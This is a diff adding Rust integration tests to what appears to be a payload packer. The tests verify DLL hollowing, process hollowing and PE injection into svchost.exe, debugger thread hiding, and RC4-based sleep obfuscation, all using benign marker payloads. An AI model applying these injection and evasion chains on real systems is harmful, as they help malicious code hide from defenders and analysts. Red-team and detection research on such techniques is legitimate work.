+        "dll_hollowing_x64",
+        "examples/payloads/demo_shellcode.bin",
+        "shellcode",
+        &[],
+        "  - technique: dll_hollowing\n    params: { module: wininet.dll }\n",
+    );
+    let run = Command::new(&artifact)
+        .output()
+        .expect("run the dll_hollowing artifact");
+    assert_eq!(
+        run.status.code(),
+        Some(42),
+        "the hollowed shellcode did not run: stdout={} stderr={}",
+        String::from_utf8_lossy(&run.stdout),
+        String::from_utf8_lossy(&run.stderr)
+    );
+}
+
+/// Compiles `examples/payloads/test_tls_payload.rs` once and returns its path.
+#[cfg(feature = "live-tests")]
+fn build_tls_payload() -> PathBuf {
+    static BUILT: std::sync::OnceLock<PathBuf> = std::sync::OnceLock::new();
+    BUILT
+        .get_or_init(|| {
+            let src = Path::new(env!("CARGO_MANIFEST_DIR"))
+                .join("examples")
+                .join("payloads")
+                .join("test_tls_payload.rs");
+            let out =
+                std::env::temp_dir().join(format!("picaro_tls_payload_{}.exe", std::process::id()));
+            let status = Command::new("rustc")
+                .arg(&src)
+                .args(["-O", "-C", "strip=symbols", "-o"])
+                .arg(&out)
+                .status()
+                .expect("run rustc to build the TLS payload");
+            assert!(status.success(), "the TLS payload must compile");
+            out
+        })
+        .clone()
+}
+
+/// Runs a packed TLS-payload artifact and asserts both markers: the payload's
+/// `DLL_PROCESS_ATTACH` callback ran before its entry point, which is what the
+/// stub's TLS provisioning is for.
+#[cfg(feature = "live-tests")]
+fn assert_tls_markers(name: &str, artifact: &Path) {
+    let tls_marker = PathBuf::from(format!("dist/{name}.tls_marker"));
+    let main_marker = PathBuf::from(format!("dist/{name}.main_marker"));
+    let _ = std::fs::remove_file(&tls_marker);
+    let _ = std::fs::remove_file(&main_marker);
+
+    let run = Command::new(artifact)
+        .env("PICARO_TLS_MARKER", &tls_marker)
+        .output()
+        .expect("run the TLS artifact");
+    assert_eq!(
+        run.status.code(),
+        Some(42),
+        "the payload's exit code was not relayed: stdout={} stderr={}",
+        String::from_utf8_lossy(&run.stdout),
+        String::from_utf8_lossy(&run.stderr)
+    );
+
+    let tls = std::fs::read_to_string(&tls_marker)
+        .unwrap_or_else(|e| panic!("{name}: the TLS callback wrote no marker ({e})"));
+    assert!(
+        tls.contains("TLS_CALLBACK_MARKER_3b1f9d"),
+        "{name}: unexpected TLS marker: {tls}"
+    );
+    let main = std::fs::read_to_string(&main_marker)
+        .unwrap_or_else(|e| panic!("{name}: the entry point wrote no marker ({e})"));
+    assert!(
+        main.contains("MAIN_ENTRY_MARKER_a1c2e4"),
+        "{name}: unexpected main marker: {main}"
+    );
+}
+
+/// `process_hollowing` provisions the payload's TLS: its `DLL_PROCESS_ATTACH`
+/// callback fires on the hollowed target's main thread before the entry point.
+#[test]
+#[cfg(feature = "live-tests")]
+#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
+fn packs_and_runs_a_hollowed_payload_with_tls_callbacks() {
+    if !cfg!(windows) {
+        return;
+    }
+    let payload = build_tls_payload();
+    let source = payload.display().to_string().replace('\\', "/");
+    let artifact = pack_execution(
+        "hollow_tls_x64",
+        &source,
+        "pe",
+        &["dist/hollow_tls_x64.main_marker"],
+        "  - technique: process_hollowing\n    params:\n      payload: payload\n      target: \"C:\\\\Windows\\\\System32\\\\svchost.exe\"\n",
+    );
+    assert_tls_markers("hollow_tls_x64", &artifact);
+}
+
+/// `pe_injection` provisions the payload's TLS through a target-resident
+/// prologue: the callback runs before the entry thread's first instruction.
+#[test]
+#[cfg(feature = "live-tests")]
+#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
+fn packs_and_runs_a_pe_injected_payload_with_tls_callbacks() {
+    if !cfg!(windows) {
+        return;
+    }
+    let payload = build_tls_payload();
+    let source = payload.display().to_string().replace('\\', "/");
+    let artifact = pack_execution(
+        "pe_injection_tls_x64",
+        &source,
+        "pe",
+        &["dist/pe_injection_tls_x64.main_marker"],
+        "  - technique: pe_injection\n    params:\n      payload: payload\n      target: \"C:\\\\Windows\\\\System32\\\\svchost.exe\"\n",
+    );
+    assert_tls_markers("pe_injection_tls_x64", &artifact);
+}
+
+/// `hide_thread_from_debugger` is inert without a debugger: the step completes
+/// and the chain still reaches the payload. The debugger-facing effect — a
+/// hidden thread's debug events never reach the debugger — needs a debugger
+/// attached and is recorded in `docs/measurements.md`.
+#[test]
+#[cfg(feature = "live-tests")]
+#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
+fn hide_thread_from_debugger_is_inert_without_a_debugger() {
+    if !cfg!(windows) {
+        return;
+    }
+    let payload = build_probe_payload();
+    let artifact = pack_probe(
+        "hide_thread_dbg",
+        "  - technique: hide_thread_from_debugger\n",
+        &["self"],
+        &payload,
+    );
+    let stdout = run_probe(&artifact);
+    assert!(
+        stdout.contains("PROBE image_path="),
+        "the payload did not run after the preparation: {stdout}"
+    );
+}
+
+/// `sleep_obfuscation`: the obfuscated sleep is a real wait of `sleep_ms` and
+/// the chain still reaches the payload afterwards (the image is decrypted and
+/// restored). What happens *during* the window — the whole image as RC4
+/// ciphertext under `PAGE_READWRITE`, then a byte-exact restore — needs an
+/// observer outside the process; `docs/measurements.md` has the sampler run.
+#[test]
+#[cfg(feature = "live-tests")]
+#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
+fn sleep_obfuscation_sleeps_and_still_runs_the_payload() {
+    if !cfg!(windows) {
+        return;
+    }
+    let payload = build_probe_payload();
+    let artifact = pack_probe(
+        "sleep_obf_e2e",
+        "  - technique: sleep_obfuscation\n    params:\n      sleep_ms: 1500\n",
+        &["self"],
+        &payload,
+    );
+    let started = std::time::Instant::now();
+    let stdout = run_probe(&artifact);
+    let elapsed = started.elapsed();
+    assert!(
+        stdout.contains("PROBE image_path="),
+        "the payload did not run after the sleep: {stdout}"
+    );
+    assert!(
+        elapsed >= std::time::Duration::from_millis(1400),
+        "the obfuscated sleep did not take sleep_ms: {elapsed:?}"
+    );
 }
